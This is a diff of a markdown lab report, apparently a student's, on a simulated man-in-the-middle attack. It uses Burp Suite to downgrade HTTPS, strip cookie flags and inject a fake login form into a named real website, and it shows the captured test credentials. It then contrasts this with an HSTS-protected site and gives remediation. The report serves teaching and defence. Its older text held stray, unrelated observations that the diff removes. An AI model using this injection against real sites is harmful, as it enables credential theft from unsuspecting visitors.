@@ -1,28 +1,32 @@
-# MiTM 1 Vulnerabilities
+# MiTM Vulnerability Report
 
-In this report i simulate a Men in the middle attack
+This report describes a simulated Man-in-the-Middle (MiTM) attack and compares a positive execution against a negative execution using HSTS.
 
 ## Tools
 
-- BURP suite
-- Curl
+- Burp Suite
+- curl
 
-## Positive Execution of the attack
+## 1. Positive Execution (Non-HSTS Target)
 
-> **Description**: Find a website that don't use HSTS, try to be between the victime and the website
+**Description:** Find a website that does not use HSTS and attempt to intercept traffic between the victim and the website.
 
-### Preliminary steps
+### Preliminary Steps
 
-1. Find a target website (<https://www.piscinadisangiovanni.com/>)
+1. Identify a target website: <https://www.piscinadisangiovanni.com/>
 
 ### Discovery
 
-1. With Curl check if the website redirect the http requests
-2. In the same comand check if present if there is HSTS
+1. Use `curl` to check if the website redirects HTTP requests to HTTPS.
+2. In the same command, verify whether HSTS is present.
 
-``` script
+```bash
 curl -I http://www.piscinadisangiovanni.com/
+```
 
+Result:
+
+```text
 HTTP/1.1 301 Moved Permanently
 Date: Fri, 19 Jun 2026 15:35:00 GMT
 Server: Apache
@@ -32,22 +36,49 @@ Expires: Sun, 21 Jun 2026 15:35:00 GMT
 Content-Type: text/html; charset=iso-8859-1
 ```
 
-> It's possible to use this website for doing a MiTM attack
+> The site redirects to HTTPS, but it does not send an HSTS header. This makes it vulnerable to a MiTM attack if the attacker can intercept the connection.
 
 ### Exploitation
 
-1. Force Burp to use TLS
-2. Enable Remove secure flags from cookies
-3. Enable Convert HTTPS links to HTTP
-4. In proxy under match and replace add this rule:
-   1. Type: Response body
-   2. Match: Una struttura polivalente e perfetta per fare sport!
-   3. Replace :  <form action="#" method="post">   <div class="form-group">     <label for="exampleInputEmail1">Email address</label>     <input type="email" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" name="uname">     <small id="emailHelp" class="form-text text-muted">Non condivideremo le tue credenziali con altri.</small>   </div>   <div class="form-group">     <label for="exampleInputPassword1">Password</label>     <input type="password" class="form-control" id="exampleInputPassword1" name="psw">   </div>   <div class="form-group form-check">     <input type="checkbox" class="form-check-input" id="exampleCheck1">     <label class="form-check-label" for="exampleCheck1">Check me out</label>   </div>   <button type="submit" class="btn btn-primary">Submit</button> </form> 
-5. Now from the attacker point of view there is this web site
-6. ![alt text](img/image.png)
-7. If the user write the from and press submit
-8. In the proxy we can see the username and password used for the login
-9. POST / HTTP/1.1
+1. Configure Burp Suite to intercept HTTPS traffic.
+2. Enable "Remove secure flags from cookies." 
+3. Enable "Convert HTTPS links to HTTP." 
+4. In Burp Proxy, add a Match and Replace rule:
+   - Type: Response body
+   - Match: `Una struttura polivalente e perfetta per fare sport!`
+   - Replace:
+
+```html
+<form action="#" method="post">
+  <div class="form-group">
+    <label for="exampleInputEmail1">Email address</label>
+    <input type="email" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" name="uname">
+    <small id="emailHelp" class="form-text text-muted">Non condivideremo le tue credenziali con altri.</small>
+  </div>
+  <div class="form-group">
+    <label for="exampleInputPassword1">Password</label>
+    <input type="password" class="form-control" id="exampleInputPassword1" name="psw">
+  </div>
+  <div class="form-group form-check">
+    <input type="checkbox" class="form-check-input" id="exampleCheck1">
+    <label class="form-check-label" for="exampleCheck1">Check me out</label>
+  </div>
+  <button type="submit" class="btn btn-primary">Submit</button>
+</form>
+```
+
+5. From the attacker's point of view, the response is modified and the victim sees a fake login form.
+
+6. Example interception screenshot:
+
+![Modified page screenshot](img/image.png)
+
+7. If the victim submits the form, the credentials are captured in Burp Proxy.
+
+8. Example request captured by the proxy:
+
+```http
+POST / HTTP/1.1
 Host: www.piscinadisangiovanni.com
 Content-Length: 37
 Cache-Control: max-age=0
@@ -62,27 +93,31 @@ Accept-Encoding: gzip, deflate, br
 Connection: keep-alive
 
 uname=test%40gmail.com&psw=securesite
+```
 
-> **Observation:** With this method it's possible to run even scripts
+> Observation: This method allows interception of credentials and sensitive data when the site does not use HSTS.
 
-## Challenge #2. Negative Execution of the attack
+## 2. Negative Execution (HSTS Target)
 
-> **Description**: Try the mitm attack with a website that use HSTS
+**Description:** Attempt the MiTM attack on a website that enforces HSTS.
 
-### Preliminary steps
+### Preliminary Steps
 
 1. Burp Suite
-2. Curl
+2. curl
 
 ### Discovery
 
-1. With Curl check if the website redirect the http requests
-2. In the same comand check if present if there is HSTS
+1. Use `curl` to check if the website sends an HSTS header.
 
-``` script
+```bash
 curl -I https://www.credem.it/
+```
 
-HTTP/2 200 
+Result:
+
+```text
+HTTP/2 200
 date: Fri, 19 Jun 2026 15:45:29 GMT
 vary: Host,Accept-Encoding
 x-content-type-options: nosniff
@@ -90,20 +125,25 @@ x-xss-protection: 1; mode=block
 strict-transport-security: max-age=31536000; includeSubDomains; preload
 ```
 
-> with this website should be impossible to be mitm
+> This site uses HSTS, which prevents HTTP downgrade attacks on clients that have previously visited the site.
 
 ### Exploitation
 
-1. Force Burp to use TLS
-2. Enable Remove secure flags from cookies
-3. Enable Convert HTTPS links to HTTP
+- If the attacker intercepts traffic before the victim's first visit, the victim may still connect over HTTP.
 
+![Initial attack screenshot](img/image3.png)
 
-> **Observation:** The victim does not need to be logged in for the attack to succeed.
-> **Observation:** This indicates the application does not properly restrict which users can view other users' delivery information.
+- If the victim has already visited the site, the browser will force HTTPS and detect the attacker's certificate instead of the site certificate. Because the attacker's CA is not trusted, the browser displays a warning.
 
-### Remediation (brief)
+![Browser certificate warning](img/image2.png)
 
-- Validate and sanitize input on both client and server sides.
-- Do not insert untrusted data using `innerHTML` or similar APIs; use safe text APIs or proper output encoding.
-- Implement authorization checks to ensure users can only access their own order information.
+## 3. Remediation
+
+- Enable HTTPS across the entire site.
+- Configure and maintain a valid certificate chain from a trusted CA.
+- Use HSTS with `includeSubDomains` and `preload` to protect returning visitors.
+
+## 4. Attacker Notes
+
+- To bypass HSTS, an attacker would need to install a malicious CA certificate on the victim's browser or device.
+- This is a strong defense mechanism, but not an absolute guarantee if the client environment is compromised.
